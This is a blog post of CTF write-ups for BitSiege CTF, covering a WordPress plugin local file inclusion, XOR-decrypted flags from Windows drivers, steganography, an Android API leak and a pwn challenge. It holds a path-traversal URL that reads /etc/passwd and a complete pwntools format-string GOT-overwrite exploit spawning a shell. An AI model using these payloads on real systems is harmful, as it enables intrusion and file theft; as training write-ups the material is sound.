---
layout: post
title: BitSiege Writeups
date: 2025-05-06
categories:
  - Ctf
  - BitSiegeCTF
tags:
  - Forensics
  - Wordpress
  - Pwn
  - FormatString
  - Driver
  - WhiteSpace
keywords:
  - ""
  - ""
description: ""
showFullContent: false
images:
  - ""
---
This past weekend, I had some time to spare and decided to attempt some of the challenges from the BitSiege CTF. The CTF had some interesting challenges which I enjoyed solving and even managed to get first blood and only solve for one of the challenges. This blog post is a walkthrough of some of the challenges.


{{< image src="/images/BitWallCTF/Pasted%20image%2020250506173842.png" alt=" " position="center" style="border-radius: 8px;" >}}


# Catalog
* [Kiwi Khaos](#kiwi-khaos)
* [Baby Canel](#baby-canel)
* [Baby Canel 2](#baby-canel-2)
* [Diastema](#diastema)
* [Invincible](#invincible)
* [Baby's First Format](#baby's-first-format)
    * [Binary Information](#binary-information)
    * [Ghidra](#ghidra)
    * [Exploit](#exploit)



### Kiwi Khaos

{{< image src="/images/BitWallCTF/kiwi.png" alt=" " position="center" style="border-radius: 8px;" >}}


This was a relatively simple web challenge, where I got first blood and ended up being the sole solver. I was rather surprised that other teams did not manage to solve it. For this challenge, we were provided with an archive `kiwimonster.zip` containing the challenge files.  Extracting the provided archive, we can see the following files which allow us to set up the challenge locally.
![](/images/BitWallCTF/tree.png)

The files look like a WordPress installation with a custom plugin named `challenge-custom`. The Dockerfile provided installs WordPress and copies the `challenge-custom` plugin to the `wp-content/plugins` directory, and permissions to read the `flag.txt` file are set.
![](/images/BitWallCTF/dockerfile.png)

During the CTF, I did not bother setting up the challenge via Docker as it would be time-consuming (pulling the image, etc.) Plus, I already had a WordPress setup on my machine, so I chose to use that instead. The setup was quite simple, I just copied the `challenge-custom` plugin to my `wp-content/plugins` directory and proceeded to the code review phase of the challenge.


Navigating through the plugin files, I came  across the `panel.php` file, which contained a local file inclusion vulnerability. Looking at the code, we can see that :
* It checks for a GET parameter `tab`, if it is set, it will include its value once allowing us to view/load its contents.
* If the parameter is not set, it will result to a default value `general.php`
* We can also see that the provided `tab` parameter is insecurely concatenated leading to a path traversal vulnerability
![](/images/BitWallCTF/code_review.png)


We can test the vulnerability by loading the `/etc/passwd` file 
```
http://localhost/wordpress/wp-content/plugins/kiwiblocks/src/admin-panel/views/panel.php?tab=../../../../../../../../../../../../../../../../../../etc/passwd
```
![](/images/BitWallCTF/lfi.png)

Now that we can confirm an unauthenticated local file read, we can read the flag from the remote instance. 
```c
$ curl 'http://54.152.96.1:9100/wp-content/plugins/kiwiblocks/src/admin-panel/views/panel.php?page=kiwiblocks&tab=../../../../../../../../../../../flag.txt'
   
<h1 class="kiwi_title">Kiwiblocks</h1>

<div class="kiwi_panel">

    BitCTF{l0c4l_f1l3_1nc1u510n_a3f5d1c89e4b2a7f}

</div>
```

> BitCTF{l0c4l_f1l3_1nc1u510n_a3f5d1c89e4b2a7f}

### Baby Canel
{{< image src="/images/BitWallCTF/baby_canel.png" alt=" " position="center" style="border-radius: 8px;" >}}

For this challenge, we are provided with three files
```c
.
├── bitwallcanel.cat
├── BitwallCanel.inf
└── BitwallCanel.sys
```

From what I gathered:
* `bitwallcanel.cat` is a digital signature file used in Windows driver packages and contains cryptographic hashes of the driver files and is signed to verify the integrity and authenticity of the driver
* `BitwallCanel.inf` is a driver installation script that tells windows how to install the driver and where to copy the related files
* `BitwallCanel.sys` is the actual driver binary, compiled for windows. It is responsible for interacting directly with the hardware or providing a low-level service.


Without prior experience working with Windows driver files, I opened the `BitwallCanel.sys` in Ghidra and jumped straight to the decryption function in the decompiled code. I found the following code which I have renamed variables for better understanding 
![](/images/BitWallCTF/baby_canel_ghidra.png)

The code is a simple decryption routine which decrypts the hardcoded encrypted flag using a hardcoded key. From the image, the code:
* Performs a XOR operation on the hardcoded `xor_key_data` with `0xbc` and stores the result in `new_xor_key`
* It then performs another XOR operation to decrypt the  `encrypted_flag` using the  `new_xor_key` and then prints the decrypted flag.


Using this information, we can build a decryptor in python
```c
#! /usr/bin/python3
def decrypt_flag():
    # XOR key - DAT_1400020d8
    xor_key_data = bytes([
        0xFE, 0xDD, 0xDE, 0xC5, 0xFF, 0xDD, 0xD2, 0xD9,
        0xD0, 0xF8, 0xCE, 0xD3, 0xCA, 0xD9, 0xE8, 0xD4,
        0xD9, 0xF8, 0xCE, 0xD5, 0xCA, 0xD9, 0xCE, 0xFF,
        0xCE, 0xDD, 0xC6, 0xC5
    ])
    
    # Encrypted flag -  DAT_1400020b0
    encrypted_flag = bytes([
        0x00, 0x08, 0x16, 0x3A, 0x17, 0x27, 0x15, 0x27,
        0x2C, 0x26, 0x0B, 0x30, 0x32, 0x17, 0x3B, 0x1E,
        0x00, 0x1B, 0x26, 0x01, 0x45, 0x3A, 0x36, 0x31,
        0x43, 0x17, 0x49, 0x0B, 0x1D, 0x24, 0x22, 0x0A,
        0x2A, 0x0D, 0x17, 0x18
    ])
    
    # First XOR operation: key ^ 0xBC (188)
    stage1_key = bytearray()
    for b in xor_key_data:
        stage1_key.append(b ^ 0xBC)
    
    # Second XOR operation: encrypted_flag ^ stage1_key (cycling)
    decrypted_flag = bytearray()
    for i in range(len(encrypted_flag)):
        key_byte = stage1_key[i % len(stage1_key)]
        decrypted_flag.append(encrypted_flag[i] ^ key_byte)
    

    flag_str = decrypted_flag.decode('ascii', errors='replace')
    print(f"Decrypted Flag: {flag_str}")

    return decrypted_flag

if __name__ == "__main__":
    decrypt_flag()
```


> Flag : Decrypted Flag: BitCTF{B@by_Drove_Th3_Dr1v3r_E@sily}


### Baby Canel 2
{{< image src="/images/BitWallCTF/babycanel2.png" alt=" " position="center" style="border-radius: 8px;" >}}



This challenge is very similar to the previous one. 
```c
.
├── babycanel2.cat
├── BabyCanel2.inf
└── BabyCanel2.sys
```


Just like before, I jumped straight to the decryption function after which I found the following code
![](/images/BitWallCTF/baby_canel_2_ghidra.png)
From the above code, we can see that the program:
* Performs a XOR operation on the hardcoded `xor_key_data` with `0xbb` and stores the result in `stage_1_xor_key`
* It then performs another XOR operation using `stage_1_xor_key` and the `encrypted_flag` after which it then prints the decrypted flag.

We can build a decryptor in python as follows
```c
#! /usr/bin/python3 
def decrypt_flag():
    # XOR key data - DAT_1400020d8
    xor_key_data = bytes([
        0xFF, 0xD2, 0xDF, 0xF9, 0xDA, 0xD9, 0xC2, 0xFA,
        0xC9, 0xC9, 0xD2, 0xCD, 0xDE, 0xFA, 0xCF, 0xEF,
        0xD3, 0xDE, 0xFA, 0xD2, 0xC9, 0xCB, 0xD4, 0xC9,
        0xCF
    ])
    
    # Encrypted flag -  DAT_1400020b0
    encrypted_flag = bytes([
        0x06, 0x00, 0x10, 0x01, 0x35, 0x24, 0x02, 0x03,
        0x32, 0x10, 0x10, 0x29, 0x24, 0x33, 0x06, 0x65,
        0x1E, 0x56, 0x25, 0x36, 0x32, 0x2F, 0x3B, 0x1A,
        0x47, 0x1B, 0x28, 0x0D, 0x30, 0x3E, 0x32, 0x49,
        0x33, 0x06, 0x0F
    ])
    
    # First XOR operation: key ^ 0xBB (187)
    stage1_key = bytearray()
    for b in xor_key_data:
        stage1_key.append(b ^ 0xBB)
    
    # Second XOR operation: encrypted_flag ^ stage1_key 
    decrypted_flag = bytearray()
    for i in range(len(encrypted_flag)):
        key_byte = stage1_key[i % len(stage1_key)]
        decrypted_flag.append(encrypted_flag[i] ^ key_byte)
    

    flag_str = decrypted_flag.decode('ascii', errors='replace')
    print(f"Decrypted Flag: {flag_str}")


    return decrypted_flag

if __name__ == "__main__":
    decrypt_flag()
```

Running the file ,we get the flag.
![](/images/BitWallCTF/baby_canel_2_flag.png)


> BitCTF{B@by_Arr1v3d_@_Th3_Air_P0rt}



###  Diastema

{{< image src="/images/BitWallCTF/diastema_desc.png" alt=" " position="center" style="border-radius: 8px;" >}}




Running the `file` command on the PDF file, we see that it is not identified as a PDF. Viewing the bytes with `xxd`, we see some interesting bytes 
![](/images/BitWallCTF/d1.png)

The `JFIF` string is a string mainly found in JPEG files. We can confirm this by viewing the [List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) where we confirm the string  as well as see the expected starting bytes for a JPEG image
![](/images/BitWallCTF/d2.png)


Comparing the  bytes with our image, we can see that the first `10` bytes are wrong in the `diastema.pdf` file. I opted to change this manually with hexeditor
![](/images/BitWallCTF/d3.png)

Running the `file` command again, we see that the file is now a valid image
![](/images/BitWallCTF/d4.png)

Opening the new image, we see the following 
![](/images/BitWallCTF/d5.png)


We can then run `stegseek` to see if there are any hidden messages in the image.
![](/images/BitWallCTF/d6.png)

We managed to extract some hidden information in the file, which contains `S` and `T` characters spaced out.  From the challenge name ,`Diastema` could mean space?? Googling ciphers related to spaces, I came across [Whitespace Language Cipher](https://www.dcode.fr/whitespace-language?__r=1.8709414a99d9e90b0e6c45c4256c8e47). 
![](/images/BitWallCTF/d7.png)


### Invincible
{{< image src="/images/BitWallCTF/inv1.png" alt=" " position="center" style="border-radius: 8px;" >}}



Extract the `invincible.aab` file and head to the `lib` directory
![](/images/BitWallCTF/inv2.png)

Checking for any http strings we come across the following api endpoint
![](/images/BitWallCTF/inv3.png)

Visiting the endpoint, we get the following message
![](/images/BitWallCTF/inv4.png)

We can fuzz the root path after which we find an `openapi.json` and `docs` endpoint
![](/images/BitWallCTF/inv5.png)

Visiting the `docs` endpoint, we find a swagger documentation with a hidden endpoint and an exposed secret key.
![](/images/BitWallCTF/inv6.png)
Sending the request gives us the flag.
![](/images/BitWallCTF/flag.png)

* https://medium.com/@elliptic1/visibility-of-flutter-code-in-a-decompiled-android-apk-4ae018aa5342



### Baby's First Format
{{< image src="/images/BitWallCTF/bb1.png" alt=" " position="center" style="border-radius: 8px;" >}}


#### Binary Information
`Binary Type`

* Checking the file type of the binary, we can confirm that the file is a `64bit` executable which is dynamically linked.
```c
baby_fmt: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0e903b516c692c7b0a17a55e4dd226448c453a56, for GNU/Linux 3.2.0, stripped
```

Looking at the binary , we can see that all permissions are enabled except the `Partial RELRO` and `NO PIE`. This means that the binary addresses are static and don't change.
![](/images/BitWallCTF/bb2.png)

#### Ghidra
Opening up the binary in Ghidra, we can view the decompiled program. I renamed most of the functions for a better understanding. The main function calls two functions `setup` and `vuln`.
![](/images/BitWallCTF/bb3.png)

Looking at the `vuln` function, we can see that it is vulnerable to a format string vulnerability. There is also a buffer overflow vulnerability where an input of `120` bytes is read into a `104` sized buffer. Moreover, the program ensures that our input contains the string `funny` and then calls a `transform_input` on the input entered.
![](/images/BitWallCTF/bb4.png)

Looking at the `transform_input` function, we can see that it swaps characters based on their index in our input. Basically, the transformation rules are as follows:
- Lowercase letters (a-z) are shifted by (position + position//7*-7), wrapping around if needed
- Uppercase letters (A-Z) are replaced with null bytes
- Digits (0-9) are shifted similarly to lowercase letters but with different wrapping
- Characters '%' and '$' (both must be present??) get a special transformation
- Other characters remain unchanged

![](/images/BitWallCTF/bb5.png)

There is also a win function that spawns a shell when called, indicating that this is a ret2win challenge
![](/images/BitWallCTF/bb6.png)

We can run the binary to get a better understanding of how it works.
![](/images/BitWallCTF/bb7.png)

From our input, we can see that our input is transformed  before being passed to the `printf` function. This means that , when we enter our format string payload , it will be transformed to something different e.g `%p` -> `%h`, which will hinder our exploitation. Therefore, we need to reverse engineer the `transform_input` function so that what we enter, will be transformed to produce an input of `%p`

I built a simple program to reverse the transformation
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from sys import argv
def reverse_transform_bytes(transformed_data: bytes) -> bytes:
    result = bytearray(transformed_data)
    length = len(result)
    
    for i in range(length):
        pos_modifier = i + (i // 7) * -7  # Same as i % 7
        if result[i] == 0:
            result[i] = ord('A')
            continue
        char_code = result[i]
        if ord('a') <= char_code <= ord('z'):
            reversed_char = char_code - pos_modifier
            if reversed_char < ord('a'):
                reversed_char += 26
            result[i] = reversed_char
        
        elif ord('0') <= char_code <= ord('9'):
            reversed_char = char_code - pos_modifier
            if reversed_char < ord('0'):
                reversed_char += 10
            result[i] = reversed_char
    return bytes(result)

print(reverse_transform_bytes(argv[1].encode()).decode())
```


We can run the script and give it the input that we want to be passed to the `printf` function, in this case a format string payload. The script will generate a string which when transformed by the program will result to the input we want.
![](/images/BitWallCTF/bb8.png)

Now that we can enter format string payloads,  let's find the injection point
![](/images/BitWallCTF/bb9.png)
We find the injection point is `6`, we can confirm as follows
![](/images/BitWallCTF/bb10.png)

#### Exploit
Now that we have a confirmed format string vulnerability which we can leverage as a `write what where`, we can look for addresses that we can overwrite to redirect execution to an arbitrary location. A good place to start is to try and overwrite got entries, since the binary only has `PARTIAL RERLO` , we can overwrite GOT entries.  Looking at the addresses loaded into the GOT, we find the following
![](/images/BitWallCTF/bb11.png)

Only the `__stack_chk_fail` function is called after our `printf` function, making it a suitable candidate. However, just  overwriting its GOT entry with an arbitrary address e.g `0xdeadbeef` will not work. The function is only triggered when the canary value is invalid/overwritten, therefore, we need to overwrite the canary with garbage data to trigger the  `__stack_chk_fail` function. Below is a snippet of the attack plan
```python
.....SNIP.....
print(f'[*] Overwriting __stack_chk_fail with {hex(win)}')
payload=fmtstr_payload(injection,{
    stack_chk_fail:p64(win), # Overwrite __stack_chk_fail with the win function
    })

print(f'[*] Adding excess bytes to overwrite the canary and trigger __stack_chk_fail')
payload=reverse_transform_bytes(payload) # transform the bytes as required by the program
payload+= b'funny' # add the mandatory string
payload+= b'b'*(120-len(payload)) # add b's until a length of 120 is  reached. This will trigger a  buffer overflow, overwrite the canary, triggering stack_chk_fail
target.sendline(payload)
```

When will execute the above snippet and try with a win function with address `0xdeadbeef`, we see that we are redirected to the address.
![](/images/BitWallCTF/bb12.png)


Now, let's swap the address with the win function that spawns a shell. Below is the final exploit
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
# Set up pwntools for the correct architecture
context.update(arch="amd64",os="linux")
context.log_level='debug' if args.DEBUG else 'warning'
elf = context.binary = ELF('./baby_fmt',checksec=False)
target = remote("docker.lab", 5000) if args.REMOTE or args.remote else process()

def reverse_transform_bytes(transformed_data: bytes) -> bytes:
    result = bytearray(transformed_data)
    length = len(result)
    
    for i in range(length):
        pos_modifier = i + (i // 7) * -7  # Same as i % 7
        if result[i] == 0:
            result[i] = ord('A')
            continue
        char_code = result[i]
        if ord('a') <= char_code <= ord('z'):
            reversed_char = char_code - pos_modifier
            if reversed_char < ord('a'):
                reversed_char += 26
            result[i] = reversed_char
        
        elif ord('0') <= char_code <= ord('9'):
            reversed_char = char_code - pos_modifier
            if reversed_char < ord('0'):
                reversed_char += 10
            result[i] = reversed_char
    return bytes(result)

injection=6
stack_chk_fail=elf.got.__stack_chk_fail
win=0x04015cd
print(f'[*] Found __stack_chk_fail GOT at :  {hex(stack_chk_fail)}')
print(f'[*] System function at :  {hex(win)}')
print(f'[*] Overwriting __stack_chk_fail with {hex(win)}')
payload=fmtstr_payload(injection,{
    stack_chk_fail:p64(win),
    })
payload=reverse_transform_bytes(payload) 
print(f'[*] Appending magic string')
payload+= b'funny'
print(f'[*] Adding excess bytes to overwrite the canary and trigger __stack_chk_fail')
payload+= b'b'*(110-len(payload))
print(len(payload))
target.sendline(payload)
target.recv()
target.interactive()
```

![](/images/BitWallCTF/bb13.png)


> Writeups for more challs will be added